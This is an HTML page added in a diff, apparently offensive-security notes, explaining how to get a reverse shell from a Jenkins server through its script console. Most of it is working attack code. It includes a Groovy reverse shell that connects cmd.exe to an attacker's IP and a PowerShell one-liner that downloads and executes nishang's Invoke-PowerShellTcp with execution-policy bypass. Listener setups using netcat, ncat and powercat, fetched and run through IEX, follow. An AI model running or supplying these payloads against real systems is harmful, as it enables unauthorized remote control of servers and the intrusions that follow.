@@ -1,0 +1,56 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Reverse Shell</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>Reverse Shell</h1><br />1. We can create a reverse shell by executing a Groovy script like this:
+    <a
+      href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76" target="_blank">https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76</a><br />
+    In the Console Script of Jenkins(http://&lt;jenkins_server&gt;:8080/script)<br /> ◇ Command line<br />
+    <div class="codebox">
+      <div class="codebox">
+        String&nbsp;host=&quot;&lt;IpAddressAttacker&gt;&quot;;<br />int&nbsp;port=4444;<br />String&nbsp;cmd=&quot;cmd.exe&quot;;<br />Process&nbsp;p=new&nbsp;ProcessBuilder(cmd).redirectErrorStream(true).start();Socket&nbsp;s=new&nbsp;Socket(host,port);InputStream&nbsp;pi=p.getInputStream(),pe=p.getErrorStream(),&nbsp;si=s.getInputStream();OutputStream&nbsp;po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try&nbsp;{p.exitValue();break;}catch&nbsp;(Exception&nbsp;e){}};p.destroy();s.close();
+      </div>
+    </div> <br /> ◇ Powershell<br /> We need to follow the procedure already discussed <a
+      href="lation--Windows_Authentication_attacks--Kerberos--Silver_Ticket--Forge_Silver_Ticket--HOST_service--Schedule_Reverse_Powershell(option_2).html">HERE</a>.
+    We need to use a script like &#39;Invoke-PowerShellTcp.ps1&#39;, otherwise if we change only “cmd.exe” with
+    “Powershell.exe” the shell will not be fully interactive, in other words we cannot execute commands.<br /> Execute
+    this script(change the ip address with the address of you attacking machine).<br />
+    <div class="codebox">
+      <div class="codebox">
+        def&nbsp;sout&nbsp;=&nbsp;new&nbsp;StringBuffer(),&nbsp;serr&nbsp;=&nbsp;new&nbsp;StringBuffer()<br />String&nbsp;cmd&nbsp;=&nbsp;&quot;[Net.ServicePointManager]::SecurityProtocol&nbsp;=&nbsp;&#39;tls12,&nbsp;tls11,&nbsp;tls,&nbsp;Ssl3&#39;;iex(New-Object&nbsp;Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp&nbsp;-Reverse&nbsp;-IpAddress&nbsp;192.168.1.118&nbsp;-Port&nbsp;4444&quot;<br />String&nbsp;ps&nbsp;=&nbsp;&#39;powershell.exe&nbsp;-nop&nbsp;-exec&nbsp;bypass&nbsp;-c&nbsp;&quot;&#39;&nbsp;+&nbsp;cmd&nbsp;+&nbsp;&#39;&quot;&#39;&nbsp;<br />def&nbsp;proc&nbsp;=&nbsp;ps.execute()<br />proc.consumeProcessOutput(sout,&nbsp;serr)<br />println&nbsp;&quot;out&gt;&nbsp;$sout&nbsp;err&gt;&nbsp;$serr&quot;<br />
+      </div>
+    </div><br /> *At the start of cmd string we have added “<span
+      style="color:#3ad900;">[Net.ServicePointManager]::SecurityProtocol = &#39;tls12, tls11, tls, Ssl3&#39;;</span>” to
+    ensure that this script work also on older versions of Windows, where TLS2 for HTTPS requests was not a default
+    settings.<br />2. While the Attacker machine should be listening for a connection of the Jenkins server<br /> ◇
+    <span style="text-decoration:underline;">Linux Attacker machine</span>:<br />
+    <div class="codebox">
+      <div class="codebox">root@kali:/#&nbsp;nc&nbsp;-lvp&nbsp;4444</div>
+    </div><br /> <a href=""><img src="images/1170-1.png" alt="images/1170-1.png" /></a><br /> ◇ <span
+      style="text-decoration:underline;">Windows Attacker machine</span>: <br /> ▪ use netcat(can listen for both a
+    powershell and a cmd shell):<br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;http://nmap.org/dist/ncat-portable-5.59BETA1.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\ncat-portable-5.59BETA1\ncat.exe&nbsp;-vnl&nbsp;4444&quot;;<br /><br />PS&gt;&nbsp;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\ncat-portable-5.59BETA1&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;;
+      </div>
+    </div><br /> <a href=""><img src="images/1170-2.png" alt="images/1170-2.png" /></a><br /> ▪ use powercat(listening
+    for a powershell shell):<br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&quot;)<br />PS&gt;&nbsp;powercat&nbsp;-l&nbsp;-v&nbsp;-p&nbsp;4444&nbsp;-t&nbsp;1000
+      </div>
+    </div><br /> <a href=""><img src="images/1170-3.png" alt="images/1170-3.png" /></a><br /><br /><br />3. Now we can
+    execute the Groovy script from the Jenkins server and gain a shell on our attacker machine<br /> <a href=""><img
+        src="images/1170-4.png" alt="images/1170-4.png" /></a>
+  </div>
+</body>
+
+</html>
